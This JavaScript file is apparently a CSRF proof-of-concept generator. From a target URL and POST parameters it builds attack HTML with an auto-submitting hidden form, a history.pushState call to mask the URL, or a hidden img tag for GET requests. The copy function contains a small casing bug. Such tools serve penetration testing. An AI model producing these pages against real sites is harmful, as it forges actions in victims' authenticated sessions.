var selectedHTTPMethod = document.getElementById("select-method");
var postBody = document.getElementById("post-data");
var submitInit = document.getElementById("submit-input");
var targetUrl = document.getElementById("target-url");


console.log(selectedHTTPMethod);

function toShowOrNotToShow() {
    var selectedValue = selectedHTTPMethod.value;
    if (selectedValue == "POST") {
        postBody.disabled = false;
    } else {
        postBody.disabled = true;
    } 
}

selectedHTTPMethod.addEventListener('change', toShowOrNotToShow);

function handleSubmit() {
    var submittedUrl = targetUrl.value;
    var submittedPost = postBody.value;
    var pocOutputBox = document.getElementById("poc-output");
    var splitParams = submittedPost.split('&');
    if (selectedHTTPMethod.value == "GET") {
        pocOutputBox.value = `
<html>
<head>
<title>CSRF PoC</title>
</head>
<body>
<img src="${submittedUrl}" style="hidden">
</body>
</html>`;
    } else {
        var stringToFill = "";
        for (var i = 0; i < splitParams.length; i++) {
            var keyValue = splitParams[i].split('=');
            var key = keyValue[0];
            var value = keyValue[1];
            stringToFill += `<input type=hidden name="${key}" value="${value}">\n`;
        }
        pocOutputBox.value = 
        `
<html>
<head>
<title>CSRF PoC</title>
</head>
<body>
        <form action="${submittedUrl}" method="POST">
        ${stringToFill}
        </form>
        <script>
        history.pushState('','','/');
        document.forms[0].submit();
        </script>
</body>
</html>
        `
    }
}

submitInit.addEventListener('click', handleSubmit);

function copyToClipboard() {
    var pocOutputToCopy = document.getElementById("poc-output").textcontent;
    navigator.clipboard.writeText(pocOutputToCopy)
}